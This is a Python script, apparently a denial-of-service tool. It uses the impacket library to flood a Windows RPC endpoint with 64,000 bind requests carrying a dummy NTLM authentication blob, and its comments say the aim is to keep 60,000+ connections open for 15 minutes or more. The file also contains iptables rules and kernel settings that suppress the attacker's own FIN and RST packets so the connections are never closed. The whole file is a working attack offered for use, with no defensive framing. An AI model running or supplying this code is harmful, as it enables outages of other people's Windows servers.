from impacket.dcerpc.v5.rpcrt import *
from impacket.dcerpc.v5 import transport, dcomrt
from impacket.uuid import string_to_bin, uuidtup_to_bin
# This should make 60,000+ open connections on a windows box
# rpc has a crazy default timeout so they last awile.. 15min+
# All connections are also authentication requests...
# Sometimes tcp will fail, sometimes it wont.
# Its rather fun regardless!

def first_msg_transfer(first_auth_packet, rtransport):
 	abstract_syntax = ('99fcfec4-5260-101b-bbcb-00aa0021347a', '0.0')
 	transfer_syntax = ('8a885d04-1ceb-11c9-9fe8-08002b104860', '2.0')
 	ctx = 0
 	callid = 1
 	bind = MSRPCBind()
 	item = CtxItem()
 	item['AbstractSyntax'] = uuidtup_to_bin(abstract_syntax)
 	item['TransferSyntax'] = uuidtup_to_bin(transfer_syntax)
 	item['ContextID'] = ctx
 	item['TransItems'] = 1
 	bind.addCtxItem(item)
 	packet = MSRPCHeader()
 	packet['type'] = MSRPC_BIND
 	packet['pduData'] = str(bind)
 	packet['call_id'] = callid
 	sec_trailer = SEC_TRAILER()
 	sec_trailer['auth_type']   = RPC_C_AUTHN_WINNT
 	sec_trailer['auth_level']  = RPC_C_AUTHN_LEVEL_CONNECT
 	sec_trailer['auth_ctx_id'] = ctx + 79231 
 	pad = (4 - (len(packet.get_packet()) % 4)) % 4
 	if pad != 0:
	  	packet['pduData'] += '\xFF'*pad
  		sec_trailer['auth_pad_len']=pad
 	packet['sec_trailer'] = sec_trailer
 	# We insert that shit here!!!!!!!!!!
 	packet['auth_data'] = str(first_auth_packet)
 	rtransport.connect()
 	rtransport.send(packet.get_packet())


ip = '192.168.1.1'
stringBinding = r'ncacn_ip_tcp:%s' % ip
rtransport = transport.DCERPCTransportFactory(stringBinding)

# You can mess with the flags if you like!
dummy_ntlm = 'NTLMSSP\x00\x01\x00\x00\x00\x06\xb2\x08\xa2\t\x00\t\x00\x30\x00\x00\x00\x08\x00\x08\x00(\x00\x00\x00\n\x00\x00(\x00\x00\x00\x0fCOMPNAMEWORKGROUP'

for i in range(64000):
    first_msg_transfer(dummy_ntlm, rtransport)
    print 'Making Connection: %s' % i




# We need to edit linux a bit to block some packets, its pretty simple.
# To Enable It #
'''
iptables -I OUTPUT -p tcp --tcp-flags FIN,ACK FIN,ACK -j DROP
iptables -I OUTPUT -p tcp --tcp-flags FIN,PSH,ACK FIN,PSH,ACK -j DROP
iptables -I OUTPUT -p tcp --tcp-flags RST,ACK RST,ACK -j DROP
# Remove the finwait1
echo 0 > /proc/sys/net/ipv4/tcp_max_orphans
# Set a larger port range
echo '1024   65000' > /proc/sys/net/ipv4/ip_local_port_range
'''

# To Disable It #
'''
iptables -F
echo 4096 > /proc/sys/net/ipv4/tcp_max_orphans
echo '32768   61000' > /proc/sys/net/ipv4/ip_local_port_range
'''
